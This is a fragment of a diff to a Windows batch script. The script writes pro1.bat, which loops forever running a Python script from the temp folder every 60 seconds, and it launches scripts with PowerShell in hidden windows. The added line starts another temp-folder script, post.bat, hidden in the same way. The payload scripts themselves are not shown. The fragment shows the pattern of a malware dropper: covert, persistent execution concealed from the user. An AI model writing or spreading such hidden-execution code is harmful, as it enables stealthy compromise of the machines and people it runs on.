@@ -59,4 +59,5 @@ echo    python3 %temp%\sh1.py >> pro1.bat
 echo    timeout /t 60 >nul >> pro1.bat
 echo    ) >> pro1.bat
 echo    goto loop >> pro1.bat
+powershell -c "Start-Process -FilePath "%temp%\post.bat" -WindowStyle Hidden"
 powershell -c "Start-Process -FilePath "%temp%\pro1.bat" -WindowStyle Hidden"
